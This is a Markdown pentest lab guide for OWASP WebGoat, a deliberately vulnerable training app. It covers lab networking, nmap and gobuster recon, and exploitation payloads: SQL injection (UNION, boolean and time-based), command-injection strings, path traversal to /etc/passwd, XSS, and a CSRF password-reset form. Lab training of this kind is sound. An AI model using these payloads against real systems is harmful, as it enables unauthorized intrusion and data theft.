# 1. Introduction to WebGoat

## What WebGoat Is

- A deliberately vulnerable Java/Tomcat web application
- Designed as an interactive OWASP Top 10 training platform
- Includes dozens of lessons with increasing complexity
- Often paired with WebWolf for multi‑stage attacks

## Why WebGoat Matters

- More realistic than DVWA
- Includes multi‑step, real‑world vulnerability chains
- Teaches both offensive and defensive concepts
- Excellent for practicing recon → enumeration → exploitation → reporting

## What WebGoat Is NOT

- Not a modern secure web app
- Not representative of hardened enterprise systems
- Not meant for production use

# 3. Lab Setup & Networking

## Recommended Setup

- Kali: NAT + Host‑only
- WebGoat: Host‑only (via OWASP BWA or standalone JAR)

## Verify Connectivity

```bash
ip a
ping <WebGoat-IP>
curl -I http://<WebGoat-IP>:8080/WebGoat
```

## Common Issues

- Tomcat not running
- Wrong port (default is 8080)
- WebWolf not started
- Java version mismatch

# 4. Reconnaissance Workflows

## Host Discovery

```bash
nmap -sn <network>/24
netdiscover
arp-scan <network>/24
```

## Port Scanning

```bash
nmap -sC -sV -oN webgoat_scan.txt <IP>
```

## What You Should Identify

- Tomcat version
- Java version
- WebGoat path (`/WebGoat/`)
- WebWolf path (`/WebWolf/`)
- Additional apps on the same host

# 5. Enumeration Workflows

## Directory Enumeration

```bash
gobuster dir -u http://<IP>:8080/WebGoat -w /usr/share/wordlists/dirb/common.txt
```

### What to Look For

- `/WebGoat/login`
- `/WebGoat/start.mvc`
- `/WebGoat/lesson/*`
- `/WebWolf/`

---

## Parameter Enumeration

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hl 0 http://<IP>:8080/WebGoat/lesson/Injection/SQLInjection/attack?userid=FUZZ
```

---

## Cookie & Session Enumeration

```bash
curl -I http://<IP>:8080/WebGoat
```

Look for:

- `JSESSIONID`
- `WebGoatSession`

---

## Header Enumeration

```bash
curl -I http://<IP>:8080/WebGoat
```

Look for:

- Server version

- Missing security headers

## WebWolf Enumeration

# 7. Exploitation Workflows

Below are **school‑level explanations** + **real‑world parallels**.

---

## SQL Injection (Classic)

### Manual Testing

```bash
curl "http://<IP>:8080/WebGoat/SqlInjection/attack?userid=1'-- -"
```

### Extract Database Names

```bash
1' UNION SELECT schema_name,2 FROM information_schema.schemata-- -
```

### Real‑World Parallel

Legacy Java apps still suffer from SQLi due to unsafe JDBC concatenation.

---

## SQL Injection (Blind)

### Boolean‑Based

```bash
1' AND 1=1-- -
1' AND 1=2-- -
```

### Time‑Based

```bash
1' AND SLEEP(5)-- -
```

---

## Command Injection

### Test Payloads

```bash
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | uname -a
```

---

## Path Traversal

```bash
../../../../etc/passwd
```

---

## XSS (Reflected)

```bash
<script>alert(1)</script>
```

---

## XSS (Stored)

```bash
"><script>alert('pwned')</script>
```

---

## CSRF

### Example Attack Form

```html
<form action="http://<IP>:8080/WebGoat/PasswordReset/change" method="POST">
  <input type="hidden" name="password" value="hacked">
  <input type="submit">
</form>
```
